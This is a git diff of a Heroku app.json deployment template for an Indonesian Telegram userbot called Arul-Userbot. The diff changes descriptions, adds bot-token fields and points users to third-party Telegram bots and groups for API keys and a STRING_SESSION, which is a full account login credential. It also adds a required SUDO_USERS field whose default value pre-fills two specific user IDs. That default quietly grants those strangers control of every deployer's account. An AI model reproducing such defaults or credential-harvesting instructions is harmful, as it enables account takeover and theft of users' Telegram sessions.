@@ -1,25 +1,29 @@
 {
-  "name": "⋆ 𝗔𝗿𝘂𝗹-𝙐𝙨𝙚𝙧𝙗𝙤𝙩 ⋆",
-  "description": "[Arul-Userbot] Userbot Hanya Untuk Bersenang - Senang",
-  "logo": "https://telegra.ph/file/10fab266482d61882bfe2.jpg",
-  "keywords": ["telegram", "userbot", "Arul-Userbot", "modular", "python"],
+  "name": "Arul-Userbot",
+  "description": "[Arul-Userbot] userbot Telegram modular yang berjalan pada Python 3.9+",
+  "logo": "https://telegra.ph/file/2f65a0bca623dac118daa.jpg",
+  "keywords": ["telegram", "userbot", "man-userbot", "modular", "python"],
   "repository": "https://github.com/muhadamp/Arul-Userbot",
   "stack": "container",
   "env": {
     "API_KEY": {
-      "description": "Dapatkan API KEY di Grup » https://t.me/wibu_telegram » Lalu ketik #api atau di web my.telegram.org Masukan yg APP ID Telegram",
+      "description": "Dapatkan API KEY di web my.telegram.org atau t.me/ScrapDionRobot dan Masukan yg APP ID Telegram",
       "required": true
     },
     "API_HASH": {
-      "description": "Dapatkan API Hash di Grup » https://t.me/wibu_telegram » Lalu ketik #api atau di web my.telegram.org",
+      "description": "Dapatkan API Hash di web my.telegram.org atau t.me/ScrapDionRobot",
       "required": true
     },
-    "CMD_HANDLER": {
-      "description": "Isi dengan cmd bisa pake . atau apa aja",
-      "value": "+"
+    "BOT_TOKEN": {
+      "description": "Buat Bot di t.me/botfather Masukan BOT tokennya disini",
+      "required": false
+    },
+    "BOT_USERNAME": {
+      "description": "Buat Bot di t.me/botfather Masukan BOT Usernamenya pake @",
+      "required": false
     },
      "STRING_SESSION": {
-      "description": "Dapatkan String Session di Grup » https://t.me/wibu_telegram » Lalu ketik #string",
+      "description": "Dapatkan String Session di Grup » https://t.me/DionSupport » Lalu ketik #string",
       "required": true
     },
     "HEROKU_APP_NAME": {
@@ -31,8 +35,13 @@
       "required": true
     },
     "BOTLOG_CHATID": {
-      "description": "Buatlah grup telegram publik lalu masukan @MissRose_bot ketik /id, masukan id grup nya disini. contoh: -1001473548xxx",
+      "description": "Buatlah grup telegram publik lalu masukan @DionXRobot ketik /id, masukan id grup nya disini. contoh: -1001473548xxx",
       "value": "Isi id grup mu wajib dengan awalan -100",
+      "required": true
+    },
+    "SUDO_USERS": {
+      "description": "Isi dengan ID user yang kamu percayai!",
+      "value": "1780335957 1878075436",
       "required": true
     }
   },
